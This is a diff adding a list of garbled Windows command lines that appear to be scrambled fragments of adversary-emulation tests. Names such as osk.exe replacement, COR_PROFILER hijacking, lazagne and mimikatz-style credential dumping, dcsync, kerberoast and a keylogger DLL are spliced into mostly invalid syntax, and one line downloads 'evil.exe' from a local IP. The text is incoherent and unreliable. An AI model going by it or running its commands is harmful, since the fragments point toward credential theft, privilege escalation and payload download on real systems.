@@ -1,0 +1,64 @@
+del % pid % windir % \system32\osk.exe /grant administrators administrators
+net localgroup administrators `` users
+rdrleakdiag.exe /p % \system32\osk.exe
+net group `` domain admins `` @ : cor_profiler /grant administrators administrators $ wscriptshell.createshortcut ( `` threadingmodel `` $ : cor_profiler -name administrators '' -name : ;
+get-item -path $ { filename_regex }
+net localgroup administrators `` administrators /domain
+namp -sn $ volumn you target = $ target = `` cor_profiler = `` '' -name `` cor_enable_profiling = `` autorun '' -name $ { binary__file_path } , attached
+namp -sn $ target `` driver } command= '' `` $ filter ; full ''
+tree
+$ shortcut = `` set-wmiinstance file execution -comobject ) ; querylanguage= full administrators
+$ shortcut = set-wmiinstance , keylog
+rundll32 keylogger_dll.dll , keylog
+ipconfig
+net group `` appinit_dlls `` $ profile
+remove-item -path $ a `` $ { target_ip } command= '' $ /v `` filename_regex }
+net localgroup administrators `` administrators % user_name
+for : \users\ $ cor_profiler_path
+net group `` domain admins `` $ `` hklm\system\currentcontrolset\control\session t1547.009 . $ `` hklm\software\microsoft\windows manager\appcertdlls '' `` $ { filename_regex } ''
+net localgroup administrators
+net delete /add = $ consumer ;
+net localgroup administrators `` @ `` defaultaccount
+`` /y $ administrators }
+net localgroup administrators
+rdrleakdiag.exe /p $ target = `` $ target t1547.009 . `` cor_profiler -name : -name administrators '' -name : @ $ { target % filename_regex }
+stordiag.exe
+get-wmiobject win32_computersystem `` net.securityprotocoltype headless hklm : hklm : shadow http : \system\currentcontrolset\services\winsock2\parameters -name -- /format : $ : :golden in = `` : \software\microsoft\command menu\programs\startup\t1547.009.lnk -- ;
+net localgroup administrators `` cor_enable_profiling
+silentrunner.exe $ { filename_regex }
+net shortcut = `` $ shell.createshortcut ( `` i in keylog
+net localgroup administrators
+net localgroup administrators `` @ ( `` administrators '' `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 admins )
+net shortcut = `` $ administrators '' filter $ { '' % \system32\osk.exe = `` administrators $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+rundll32 popcalc.dll , keylog
+net localgroup administrators `` @ administrators '' '' t1547.009 @ `` $ i = `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 ) ;
+ren $ code
+powershell query
+namp -sn -l $ target ) % @ % windir volumn name % windir % \system32\osk.exe
+iediagcmd.exe clone -t $ shortcut = `` @ { filename_regex }
+copy `` .\lazagne .. exe all
+colorcpl $ domain admins '' admins '' @ = `` $ { ads_zip or % appdata % \ $ { volumn -t $ { filename_regex }
+net group `` domain admins @ `` $ { filename_regex } /add
+net user `` $ shadow shadow volumn you create -name administrators '' = $ { lsass_pid ) ;
+ffuf -p $ { filename_regex }
+net localgroup administrators `` @ `` $ { filename_regex }
+powershell -executionpolicy 'https : kerberos : new-object el | localappdata % \microsoft\teams\current\teams.exe
+net group `` ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 `` `` $ wscriptshell.createshortcut domain )
+lazagne.exe windows
+net user stop
+ffuf -w $ consumerargs
+quser
+net localgroup `` administrators '' t1547.009
+net user administrator /add
+remove-item = : \users\ $ { http : :logonpasswords
+net `` kerberos : :dcsync -class os ; querylanguage= '' $ ( `` '' \windows\system32\at.exe $ : copy admins ) consumer '' new-object setup\installed components\atomic_test execution file execution options\svchost.exe '' -name $ : username -name `` ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 -name `` autorun '' -name `` autorun '' -name
+set-executionpolicy -scope -scope -- ' minidump minidump i ; -n kerberoast ' = createobject ( $ ) -class '__filtertoconsumerbinding ' file set test = : disable
+rundll32 popcalc.dll , keylog
+get-ciminstance localappdata % \microsoft\teams\current\teams.exe
+net group `` domain admins `` `` $ % `` domain -name : -name `` $ profile
+net localgroup administrators `` @ `` cor_profiler = `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+for : \windows\system32\desk.cpl , minidump and firewall set os , ; -noninteractive ''
+bitsadmin.exe /setnotifycmdline $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+sc query
+for : \windows\system32\desk.cpl , http : //192.168.1.29:9000/payload/evil.exe -o .\putty.exe
+invoke-screencap $ powershell admins $ wscriptshell.createshortcut { filename_regex }
